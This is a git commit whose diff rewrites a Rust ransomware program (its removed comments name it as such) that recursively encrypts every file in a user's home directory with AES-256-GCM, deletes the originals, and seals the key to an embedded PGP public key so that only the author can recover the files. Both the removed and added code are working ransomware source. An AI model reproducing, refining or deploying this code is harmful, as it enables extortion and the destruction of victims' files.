6f825f8b8cd201374c053dde092f1faf54a2e613
CiroBurro <filobaglioni.06@proton.me>
2026-01-24 09:03:24 +0100

    Double encryption and memory zeroing features added

--- src/main.rs
+++ src/main.rs
@@ -1,77 +1,36 @@
-// Necessary imports
 use aes_gcm::{
-    aead::{rand_core::OsError, Aead},
+    aead::{Aead, OsRng},
     AeadCore, Aes256Gcm, KeyInit,
 };
-use dirs2::{data_dir, desktop_dir, document_dir, download_dir, picture_dir};
+use dirs2::{data_dir, home_dir};
+use pgp::{
+    composed::{Deserializable, MessageBuilder, SignedPublicKey},
+    crypto::sym::SymmetricKeyAlgorithm,
+};
 use rayon::prelude::*;
 use std::{
     fs::{read, read_dir, remove_file, File},
     io::{Error, Write},
     path::PathBuf,
 };
+use zeroize::Zeroize;
 
-// Main function of the program
-fn main() -> Result<(), OsError> {
-    // Get all the directories where the ransomware is going to run
-    let desktop_dir = desktop_dir();
-    let document_dir = document_dir();
-    let download_dir = download_dir();
-    let picture_dir = picture_dir();
-    let mut dirs: Vec<PathBuf> = vec![];
+const PUB_KEY_STR: &str = r#"
+-----BEGIN PGP PUBLIC KEY BLOCK-----
 
-    // Check if they exist
-    if desktop_dir.is_some() {
-        dirs.push(desktop_dir.unwrap());
-    }
-    if document_dir.is_some() {
-        dirs.push(document_dir.unwrap());
-    }
-    if download_dir.is_some() {
-        dirs.push(download_dir.unwrap());
-    }
-    if picture_dir.is_some() {
-        dirs.push(picture_dir.unwrap());
-    }
-
-    // Generate a cipher to encrypt files with aes2356 algorithm
-    let key = Aes256Gcm::generate_key()?;
-    let cipher = Aes256Gcm::new(&key);
-    let nonce = Aes256Gcm::generate_nonce()?;
-
-    // Create a recovery file inside data dir with the cipher key and nonce
-    let mut data_dir = data_dir().expect("Missing dara dir");
-    data_dir.push("recovery_file");
-    data_dir.set_extension("txt");
-    let mut recovery_file = File::create(data_dir).expect("Failed to create recovery file");
-
-    let content = format!("key: {:?}\n nonce: {:?}", &key, &nonce);
-    recovery_file
-        .write_all(content.as_bytes())
-        .expect("recovery file written");
-
-    // All the directories are encrypted in parallel using rayon multithreading
-    dirs.par_iter().for_each(|dir| {
-        // Listing all files recursively
-        let files = list_files(dir.to_owned()).expect("Couldn't list files inside the directory");
-        // Encryption
-        for file in files.iter() {
-            let content: Vec<u8> = read(&file).expect("read");
-            let ciphertext: Vec<u8> = cipher
-                .encrypt(&nonce, content.as_ref())
-                .expect("encrypt text");
-
-            // A new file with the encrypted content is created and the old one deleted
-            let mut new_path = file.clone();
-            new_path.set_extension("ciro");
-            let mut new_file = File::create(new_path).expect("file created");
-            new_file.write_all(&ciphertext).expect("text written");
-            let _ = remove_file(&file);
-        }
-    });
-
-    Ok(())
-}
+mDMEaNRDHBYJKwYBBAHaRw8BAQdAM8+crM87HecyVWi/k+a+0Vlkp4fEnpEkk2xg
+KcizQzy0LEZpbGlwcG8gQmFnbGlvbmkgPGZpbG9iYWdsaW9uaS4wNkBwcm90b24u
+bWU+iJYEExYKAD4WIQQq8+jcfYc6/q12JSDkSWtWixgznQUCaNRDHAIbAwUJBaOa
+gAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRDkSWtWixgznbMCAP4ug/jPqZ78
+1iMctTSBYBF92TdmzorGCKlv+1InZg0zMwEA5/7F5/++YqUuIoVZb1eUvlrluc50
+C1NT0TBzM1iN0AW4OARo1EMcEgorBgEEAZdVAQUBAQdA85zIyIKYuI1rRy9ozu1k
+QdhcC6lqyCOUcWcsiMuAYCADAQgHiH4EGBYKACYWIQQq8+jcfYc6/q12JSDkSWtW
+ixgznQUCaNRDHAIbDAUJBaOagAAKCRDkSWtWixgzna6bAP4yumlrKO/Xs1h3XLG8
+UgUh300R5/gZlZUHlRNb04NypAD+N3v9KcO4uVzuKNJcjyYbwy3HX7vxR76F1Py0
+JXRKgQk=
+=Nkpc
+-----END PGP PUBLIC KEY BLOCK-----
+"#;
 
 // List files function simply finds all files recursively inside a directory
 fn list_files(dir: PathBuf) -> Result<Vec<PathBuf>, Error> {
@@ -82,10 +41,69 @@ fn list_files(dir: PathBuf) -> Result<Vec<PathBuf>, Error> {
             let path = entry.path();
             if path.is_dir() {
                 files.extend(list_files(path)?);
+            } else if let Some(ext) = path.extension() {
+                if ext != "txt.key" {
+                    files.push(path);
+                }
             } else {
                 files.push(path);
             }
         }
     }
     Ok(files)
+}
+
+// Main function of the program
+fn main() {
+    let dir = home_dir().expect("Could not open home directory");
+
+    // Generate a cipher to encrypt files with aes2356 algorithm
+    let mut key = Aes256Gcm::generate_key(OsRng);
+    let cipher = Aes256Gcm::new(&key);
+
+    // Create a recovery file inside data dir with the cipher key and nonce
+    let (public_key, _) =
+        SignedPublicKey::from_string(PUB_KEY_STR).expect("Could not read public key");
+
+    let mut msg =
+        MessageBuilder::from_bytes("", key.to_vec()).seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);
+
+    msg.encrypt_to_key(OsRng, &public_key)
+        .expect("recovery key encryption failure");
+
+    let mut data_dir = data_dir().expect("Missing dara dir");
+    data_dir.push("recovery_file");
+    data_dir.set_extension("txt.key");
+    let mut recovery_file = File::create(data_dir).expect("Failed to create recovery file");
+
+    recovery_file
+        .write_all(&msg.to_vec(OsRng).unwrap())
+        .expect("recovery file written");
+
+    // Listing all files recursively
+    let files = list_files(dir.to_owned()).expect("Couldn't list files inside the directory");
+
+    // Encryption
+    let _ = files.into_par_iter().map(|file| {
+        let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
+        let content: Vec<u8> = read(&file).expect("read");
+        let ciphertext: Vec<u8> = cipher
+            .encrypt(&nonce, content.as_ref())
+            .expect("encrypt text failure");
+
+        // A new file with the encrypted content is created and the old one deleted
+        let mut new_path = file.clone();
+        if let Some(ext) = new_path.extension() {
+            new_path.set_extension(format!("{:?}.ciro", ext));
+        } else {
+            new_path.set_extension("ciro");
+        }
+        let mut new_file = File::create(new_path).expect("file created");
+        new_file.write_all(&nonce).expect("nonce written");
+        new_file.write_all(&ciphertext).expect("text written");
+        let _ = remove_file(file);
+    });
+
+    // Zeroing the key in memory
+    key.zeroize();
 }
